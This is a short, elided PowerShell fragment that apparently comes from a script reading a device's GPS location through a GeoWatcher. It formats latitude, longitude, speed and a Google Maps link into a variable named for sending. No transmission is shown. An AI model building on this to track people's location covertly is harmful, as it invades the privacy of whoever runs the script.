...
if ($GeoWatcher.Permission -eq 'Denied'){
    ...
    $sendData = "Latitude: $($send.Latitude) `nLongitude: $($send.Longitude) `nAltitude: $($send.altitude) `nCourse: $($send.Course) `nHorizontalAccuracy: $($send.HorizontalAccuracy) `nSpeed: $($send.Speed) `n`n[+] https://maps.google.com/?q=$($send.Latitude),$($send.Longitude) `n"
    Start-Sleep -Milliseconds 1000 
